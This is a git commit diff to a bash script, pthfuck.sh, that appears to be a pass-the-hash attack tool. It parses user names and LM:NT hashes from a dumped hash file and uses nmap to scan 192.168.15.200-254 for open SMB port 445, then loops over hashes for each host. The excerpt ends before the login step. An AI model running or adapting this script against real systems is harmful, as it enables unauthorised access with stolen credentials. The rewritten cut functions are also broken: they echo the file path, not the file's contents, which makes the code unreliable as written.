5d1b34fae8d3acfba47ad1a5617779710a4e2d56
zachsis <zachary.hatsis@gmail.com>
2014-09-09 10:16:04 -0600

    cut instead of awk

--- pthfuck.sh
+++ pthfuck.sh
@@ -1,9 +1,14 @@
 #!/bin/bash
-hashfile="/root/bin/passcrack/227/hashes"
+# test hash file
+hashfile="/root/bin/passcrack/227/hashes.txt"
+# actual hash file 
+#hashfile="/root/bin/passcrack/227/hashes"
 
-gethash() { awk -F: '{print $3 ":" $4}' < ${hashfile}; }
+gethash() { echo ${hashfile} | cut -d":" -f 3,4; }
+#gethash() { awk -F: '{print $3 ":" $4}' < ${hashfile}; }
  
-getuser() { awk -F: '{print $1}' < ${hashfile}; }
+getuser() { echo ${hashfile} | cut -d":" -f1 ; }
+#getuser() { awk -F: '{print $1}' < ${hashfile}; }
  
 for host in $(nmap -p 445 192.168.15.200-254 -oG - | grep open | cut -d" " -f2); do 
    for line in $(cat ${hashfile}); do
